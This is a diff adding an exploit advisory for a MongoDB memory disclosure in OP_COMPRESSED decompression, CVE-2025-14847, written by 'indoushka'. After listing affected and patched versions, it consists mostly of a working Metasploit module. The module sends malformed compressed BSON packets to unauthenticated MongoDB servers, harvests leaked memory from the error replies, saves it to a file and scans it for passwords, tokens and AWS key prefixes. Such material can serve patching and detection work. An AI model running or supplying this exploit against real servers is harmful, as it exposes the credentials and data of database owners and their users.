@@ -1,0 +1,193 @@
+=============================================================================================================================================
+| # Title     : MongoDB BSON Decompression Memory Disclosure via OP_COMPRESSED                                                              |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.mongodb.com/                                                                                                    |
+=============================================================================================================================================
+
+[+] Summary    : A memory disclosure vulnerability exists in MongoDB’s handling of compressed wire protocol messages (OP_COMPRESSED). 
+                 The issue arises from improper bounds validation during BSON decompression, where a crafted message can declare a manipulated uncompressed size and BSON document length.
+                 By sending a malformed OP_COMPRESSED packet containing a forged BSON length field and inconsistent decompression size, a remote unauthenticated 
+				 attacker may trigger an out-of-bounds read condition. This can lead to unintended disclosure of memory contents through server error responses.
+                 The vulnerability is remotely exploitable over the MongoDB service port (default: 27017) and does not require authentication under default configurations where the service is exposed.
+
+[+] Affected Versions :
+
+The vulnerability impacts the following MongoDB Server versions prior to patch releases:
+
+8.2.0 → 8.2.2
+
+8.0.0 → 8.0.16
+
+7.0.0 → 7.0.27
+
+6.0.0 → 6.0.26
+
+5.0.0 → 5.0.31
+
+4.4.0 → 4.4.29
+
+Older 4.2.x, 4.0.x, and 3.6.x branches (unpatched)
+
+Patched Versions
+
+The issue is fixed in:
+
+8.2.3
+
+8.0.17
+
+7.0.28
+
+6.0.27
+
+5.0.32
+
+4.4.30 and later
+
+[+] POC : 
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# PoC converted from Python to Metasploit Ruby module
+##
+
+require 'msf/core'
+require 'zlib'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'CVE-2025-14847 MongoDB Memory Leak',
+      'Description'    => %q{
+        This module demonstrates an educational memory leak in MongoDB BSON decompression.
+        It sends malformed BSON in OP_COMPRESSED messages to trigger memory disclosure.
+      },
+      'Author'         => [ 'Antara Mane (Python PoC)', 'Indoushka' ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2025-14847' ],
+          [ 'URL', 'https://example.com/mongodb-leak' ]
+        ],
+      'Platform'       => ['linux','win'],
+      'Arch'           => ARCH_CMD,
+      'Targets'        =>
+        [
+          [ 'Automatic', {} ]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => '2025-01-01'
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(27017),
+        OptInt.new('MIN_OFFSET', [ true, 'Minimum document length', 20 ]),
+        OptInt.new('MAX_OFFSET', [ true, 'Maximum document length', 8192 ]),
+        OptString.new('OUTPUT', [ true, 'File to save leaks', 'leaked.bin' ])
+      ])
+  end
+
+  def send_probe(doc_len, buffer_size)
+    content = "\x10a\x00\x01\x00\x00\x00"  
+    bson = [doc_len].pack('<i') + content
+
+    op_msg = [0].pack('<I') + "\x00" + bson
+    compressed = Zlib::Deflate.deflate(op_msg)
+
+    payload = [2013].pack('<I')          
+    payload += [buffer_size].pack('<i')       
+    payload += [2].pack('C')                  
+    payload += compressed
+
+    header = [
+      16 + payload.length,  
+      1,                   
+      0,                  
+      2012                  
+    ].pack('<IIII')
+
+    connect
+    sock.put(header + payload)
+    res = sock.get_once(-1, 2)
+    disconnect
+    res || ''
+  rescue
+    ''
+  end
+
+  def extract_leaks(response)
+    return [] if response.nil? || response.length < 25
+
+    leaks = []
+
+    begin
+      msg_len = response[0,4].unpack('<I')[0]
+      if response[12,4].unpack('<I')[0] == 2012
+        raw = Zlib::Inflate.inflate(response[25,msg_len-25])
+      else
+        raw = response[16,msg_len-16]
+      end
+    rescue
+      return []
+    end
+
+    raw.scan(/field name '([^']*)'/) do |m|
+      data = m[0].to_s
+      next if ['?','a','$db','ping'].include?(data)
+      leaks << data
+    end
+    raw.scan(/type (\d+)/) do |m|
+      leaks << [m[0].to_i].pack('C')
+    end
+
+    leaks
+  end
+
+  def exploit
+    print_status("[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak")
+    print_status("[*] Target: #{rhost}:#{rport}")
+    print_status("[*] Scanning offsets #{datastore['MIN_OFFSET']}-#{datastore['MAX_OFFSET']}")
+
+    all_leaked = ''
+    unique_leaks = {}
+
+    (datastore['MIN_OFFSET']..datastore['MAX_OFFSET']).each do |doc_len|
+      response = send_probe(doc_len, doc_len + 500)
+      leaks = extract_leaks(response)
+
+      leaks.each do |data|
+        next if unique_leaks[data]
+        unique_leaks[data] = true
+        all_leaked << data
+
+        if data.length > 10
+          preview = data[0,80].force_encoding('utf-8').encode('utf-8', invalid: :replace)
+          print_good("[+] offset=#{doc_len} len=#{data.length}: #{preview}")
+        end
+      end
+    end
+
+    ::File.open(datastore['OUTPUT'], 'wb') { |f| f.write(all_leaked) }
+    print_status("[*] Total leaked: #{all_leaked.length} bytes")
+    print_status("[*] Unique fragments: #{unique_leaks.length}")
+    print_status("[*] Saved to: #{datastore['OUTPUT']}")
+
+    secrets = ['password','secret','key','token','admin','AKIA']
+    secrets.each do |s|
+      if all_leaked.downcase.include?(s.downcase)
+        print_warning("[!] Found pattern: #{s}")
+      end
+    end
+  end
+end
+
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
